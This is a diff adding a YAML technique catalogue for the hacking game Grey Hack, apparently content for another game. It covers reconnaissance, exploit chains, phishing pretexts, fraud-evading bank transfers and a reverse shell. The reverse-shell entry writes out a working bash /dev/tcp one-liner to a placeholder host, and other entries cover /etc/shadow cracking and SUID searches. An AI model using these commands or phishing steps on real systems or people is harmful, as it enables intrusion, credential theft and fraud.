@@ -1,0 +1,185 @@
+game: Grey Hack
+game_id: grey_hack
+description: >
+  An open-world cyberpunk hacking sandbox with real Linux terminal emulation.
+  Grey Hack teaches genuine penetration testing methodology — nmap, exploit selection,
+  privilege escalation, and social engineering all mirror real-world techniques.
+category: sandbox_simulation
+difficulty_range: intermediate_to_expert
+terminal_depths_relevance: high
+
+techniques:
+
+  - name: Target Reconnaissance
+    id: grey_hack_recon
+    description: >
+      Using nmap and available tools to map the target before any exploit attempt.
+      Information gathered here determines the entire attack chain.
+    concepts:
+      - port scanning
+      - service fingerprinting
+      - attack surface mapping
+      - OSINT
+    steps:
+      - "Run `nmap <IP>` to discover open ports and running services"
+      - "Note software versions — exploits are version-specific"
+      - "Check `nmap -sV <IP>` for deeper service version detection"
+      - "Look for admin panels, SSH, HTTP, FTP — each has different exploit paths"
+      - "Use /etc/passwd to enumerate users once you have any access"
+    tips:
+      - "Always check /etc/passwd first when you gain shell access"
+      - "Web servers on port 80/443 often have login panels — try default credentials"
+      - "Check for users with shell access: `/bin/bash` in /etc/passwd"
+    principles:
+      - "Information gathering is 80% of any engagement"
+      - "Attack what you understand; never guess blindly"
+    related_techniques:
+      - grey_hack_exploit_chain
+      - grey_hack_social_engineering
+    difficulty: beginner
+    xp_reward: 20
+    terminal_depths_mapping: "nmap command — scan active nodes; recon is the first phase"
+
+  - name: Exploit Chain
+    id: grey_hack_exploit_chain
+    description: >
+      Purchasing version-specific exploits from the Hack Shop and chaining them
+      to gain escalating access from guest to root.
+    concepts:
+      - exploit selection
+      - privilege escalation
+      - credential cracking
+      - lateral movement
+    steps:
+      - "Match service version to an exploit in the Hack Shop (e.g., HTTP 1.1.6 exploit)"
+      - "Some exploits require a user to be logged in — send phishing email during work hours"
+      - "Gain guest shell, then copy /etc/passwd and /etc/shadow"
+      - "Use John/hashcat offline to crack password hashes"
+      - "Re-enter with cracked credentials to escalate to admin"
+    tips:
+      - "Send phishing emails between 9 AM – 5 PM in-game time for best response rate"
+      - "World-writable /tmp files can host privilege escalation scripts"
+      - "Check for cron jobs running as root — classic privesc vector"
+      - "GTFOBins-style: look for SUID binaries with `find / -perm -4000`"
+    principles:
+      - "Privilege escalation follows the same pattern everywhere: access → enum → pivot"
+      - "Credentials are reused — one cracked password often opens multiple systems"
+    related_techniques:
+      - grey_hack_recon
+      - grey_hack_social_engineering
+    difficulty: intermediate
+    xp_reward: 75
+    terminal_depths_mapping: "sudo / privilege-escalation path in Terminal Depths terminal"
+
+  - name: Social Engineering
+    id: grey_hack_social_engineering
+    description: >
+      Using gathered information to impersonate admins, send targeted phishing,
+      and manipulate NPCs into providing credentials or access.
+    concepts:
+      - social engineering
+      - phishing
+      - impersonation
+      - pretext construction
+    steps:
+      - "Gather employee names and roles from HR databases or web pages"
+      - "Identify the admin's email address format from existing addresses"
+      - "Craft a believable pretext (IT support, password reset, urgent update)"
+      - "Send the phishing email — target users with elevated privileges"
+      - "Harvest credentials from the reply or clicked link"
+    tips:
+      - "Target users during business hours — response rate drops 80% after 5 PM"
+      - "Impersonating IT support is the highest-success pretext"
+      - "Combine with recon: 'Hi [actual name], your [actual role] account needs updating'"
+    principles:
+      - "Humans are the weakest link in any security chain"
+      - "Personalization multiplies phishing success rate by 3-5x"
+    related_techniques:
+      - grey_hack_recon
+    difficulty: intermediate
+    xp_reward: 60
+    terminal_depths_mapping: "talk command — NPC dialogue can reveal credentials through trust building"
+
+  - name: Reverse Shell
+    id: grey_hack_rshell
+    description: >
+      Establishing a reverse shell to bypass firewalls that block inbound
+      connections. The target initiates the connection outward.
+    concepts:
+      - network evasion
+      - reverse connections
+      - firewall bypass
+      - persistence
+    steps:
+      - "Set up a listener on your machine: `nc -lvp 4444`"
+      - "Exploit RCE vulnerability or plant a script on target"
+      - "Target executes: `bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`"
+      - "Shell connects back — you now have interactive access through the firewall"
+    tips:
+      - "Use port 80 or 443 for the listener to blend with normal traffic"
+      - "Python reverse shell is more reliable: `python3 -c 'import socket...'`"
+      - "Always upgrade your shell: `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`"
+    principles:
+      - "When inbound is blocked, make the target call you"
+      - "Blending with normal traffic is as important as the payload itself"
+    related_techniques:
+      - grey_hack_exploit_chain
+    difficulty: advanced
+    xp_reward: 100
+    terminal_depths_mapping: "nc / netcat in Terminal Depths — reverse shell technique directly applicable"
+
+  - name: Financial Attacks
+    id: grey_hack_financial
+    description: >
+      Draining bank accounts and performing corporate takeovers for maximum
+      in-game currency while avoiding fraud detection.
+    concepts:
+      - slow-burn attacks
+      - fraud evasion
+      - financial exploitation
+    steps:
+      - "Compromise a bank server using the exploit chain"
+      - "Transfer funds in small increments — large transfers trigger fraud detection"
+      - "For corporate takeover: accumulate shares gradually to avoid price spike"
+      - "Once majority ownership: liquidate assets for massive payout"
+    tips:
+      - "Transfer no more than 5% of account balance per transaction"
+      - "Use multiple proxy hops to obscure origin of transfers"
+      - "Corporate stock value drops when you sell — time exit carefully"
+    principles:
+      - "Patience beats speed in financial attacks — slow is smooth, smooth is fast"
+    related_techniques:
+      - grey_hack_exploit_chain
+    difficulty: expert
+    xp_reward: 175
+    terminal_depths_mapping: "faction financial missions — same patience mechanic applies"
+
+lore:
+  - "Grey Hack's world runs a real Linux kernel — all commands work as expected"
+  - "The game's IP addresses are randomized per playthrough — no walkthrough tells you the exact IPs"
+  - "Senior players note that the techniques work on real CTF challenges"
+  - "The 'Hack Shop' is inspired by real exploit markets (Zerodium, etc.)"
+  - "World-writable /tmp and SUID binary abuse are genuine CVE techniques"
+
+easter_eggs:
+  - id: grey_hack_secret_file
+    filename: "GREY_HACK_FIELD_NOTES.txt"
+    content: |
+      === GREY HACK — OPERATIVE FIELD NOTES ===
+      
+      Target profile acquired. Moving to exfiltration phase.
+      
+      Reminder: /etc/passwd reveals users.
+               /etc/shadow reveals hashes.
+               /tmp is world-writable.
+               SUID binaries are your best friend.
+      
+      Social engineering success rate by pretext:
+        IT Support reset:    73%
+        CEO urgent request:  81%
+        Automated security:  68%
+        Invoice attached:    45%
+      
+      "The best social engineer is the one who sounds bored."
+      — Anonymous Red Team Lead
+    path: "/home/ghost/lore/grey_hack/"
